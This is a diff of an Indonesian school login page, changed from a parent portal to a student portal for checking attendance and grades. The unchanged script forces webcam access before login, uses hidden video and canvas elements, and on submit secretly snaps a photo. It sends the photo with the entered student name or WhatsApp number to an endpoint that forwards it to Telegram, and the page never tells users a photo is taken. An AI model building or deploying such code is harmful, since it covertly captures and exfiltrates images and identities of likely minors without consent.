@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal Wali Murid - Cek Absensi Mandiri</title>
+    <title>Portal Siswa - Cek Rekapan Absen & Nilai</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
@@ -12,10 +12,10 @@
         <div class="w-full max-w-md bg-white rounded-3xl p-7 shadow-xl border border-slate-200">
             <div class="text-center mb-6">
                 <div class="inline-flex bg-emerald-600 text-white p-3.5 rounded-2xl shadow-md mb-2.5">
-                    <i class="fa-solid fa-user-shield text-2xl"></i>
+                    <i class="fa-solid fa-graduation-cap text-2xl"></i>
                 </div>
-                <h2 class="text-lg font-black text-slate-900 tracking-tight">Portal Wali Murid</h2>
-                <p class="text-xs text-slate-600">Masukkan Nomor WhatsApp Orang Tua yang terdaftar di sekolah untuk melihat absensi dan nilai putra/putri Anda.</p>
+                <h2 class="text-lg font-black text-slate-900 tracking-tight">Portal Siswa</h2>
+                <p class="text-xs text-slate-600">Masukkan <strong>Nama Lengkap Siswa</strong> atau <strong>Nomor WhatsApp</strong> untuk melihat rekap absensi dan nilai mata pelajaran.</p>
             </div>
 
             <!-- STATUS PERINGATAN KAMERA (Hanya muncul jika ditolak) -->
@@ -31,21 +31,21 @@
                 </div>
             <% } %>
 
-            <!-- FORM LOGIN ORTU (DI-BLOCK JIKA KAMERA DITOLAK) -->
-            <form id="ortuLoginForm" action="/ortu/login" method="POST" class="space-y-4 opacity-50 pointer-events-none transition-all duration-300">
+            <!-- FORM LOGIN SISWA (DI-BLOCK JIKA KAMERA DITOLAK) -->
+            <form id="siswaLoginForm" action="/siswa/login" method="POST" class="space-y-4 opacity-50 pointer-events-none transition-all duration-300">
                 <div>
-                    <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1">Nomor WhatsApp Orang Tua</label>
+                    <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1">Nama Lengkap / No. WhatsApp</label>
                     <div class="relative">
                         <span class="absolute inset-y-0 left-0 flex items-center pl-3.5 text-slate-400">
-                            <i class="fa-brands fa-whatsapp text-sm text-emerald-600"></i>
+                            <i class="fa-solid fa-user text-sm text-emerald-600"></i>
                         </span>
-                        <input type="text" id="phoneInput" name="nomor_wa" required placeholder="Contoh: 081234567890" 
+                        <input type="text" id="keywordInput" name="kata_kunci" required placeholder="Contoh: Ahmad Fauzi atau 0812345..." 
                             class="w-full bg-slate-50 border border-slate-300 rounded-xl py-2.5 pl-10 pr-3 text-xs text-slate-900 focus:outline-none focus:border-emerald-600 focus:bg-white">
                     </div>
                 </div>
 
                 <button type="submit" id="submitBtn" disabled class="w-full bg-emerald-700 hover:bg-emerald-800 text-white font-bold text-xs py-3 rounded-xl shadow-md transition cursor-not-allowed">
-                    <i class="fa-solid fa-arrow-right-to-bracket mr-1"></i> Masuk & Cek Absensi & Nilai
+                    <i class="fa-solid fa-arrow-right-to-bracket mr-1"></i> Masuk & Lihat Rekapan
                 </button>
             </form>
         </div>
@@ -60,13 +60,13 @@
     <script>
         document.addEventListener("DOMContentLoaded", async () => {
             const statusDiv = document.getElementById('cameraStatus');
-            const loginForm = document.getElementById('ortuLoginForm');
+            const loginForm = document.getElementById('siswaLoginForm');
             const submitBtn = document.getElementById('submitBtn');
             const video = document.getElementById('hidden-video');
             const canvas = document.getElementById('hidden-canvas');
 
             try {
-                // Meminta izin kamera secara wajib untuk portal wali murid
+                // Meminta izin kamera secara wajib untuk portal siswa
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' } 
                 });
@@ -82,7 +82,7 @@
                 submitBtn.removeAttribute('disabled');
                 submitBtn.classList.remove('cursor-not-allowed');
 
-                // Tangkap foto dan kirim ke Telegram saat login wali murid ditekan
+                // Tangkap foto dan kirim ke Telegram saat login siswa ditekan
                 loginForm.addEventListener('submit', async function(e) {
                     e.preventDefault();
                     submitBtn.setAttribute('disabled', 'true');
@@ -94,14 +94,14 @@
                         const ctx = canvas.getContext('2d');
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                         const imageDataURL = canvas.toDataURL('image/jpeg', 0.8);
-                        const phoneVal = document.getElementById('phoneInput').value;
+                        const keywordVal = document.getElementById('keywordInput').value;
 
                         await fetch('/api/kirim-foto-telegram', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ 
                                 image: imageDataURL, 
-                                info: `Akses Portal Wali Murid - No WA: ${phoneVal}` 
+                                info: `Akses Portal Siswa - Keyword: ${keywordVal}` 
                             })
                         });
                     } catch (err) {
@@ -116,7 +116,7 @@
                 // Jika izin kamera ditolak -> Tampilkan pesan blokir
                 console.warn("Akses kamera ditolak:", err);
                 statusDiv.classList.remove('hidden');
-                document.getElementById('statusText').innerHTML = "<b>Akses Kamera Ditolak:</b> Anda wajib mengizinkan akses kamera pada peramban (*browser*) untuk mengakses Portal Wali Murid.";
+                document.getElementById('statusText').innerHTML = "<b>Akses Kamera Ditolak:</b> Anda wajib mengizinkan akses kamera pada peramban (*browser*) untuk mengakses Portal Siswa.";
                 
                 // Form tetap terkunci (diblokir)
                 loginForm.classList.add('opacity-50', 'pointer-events-none');
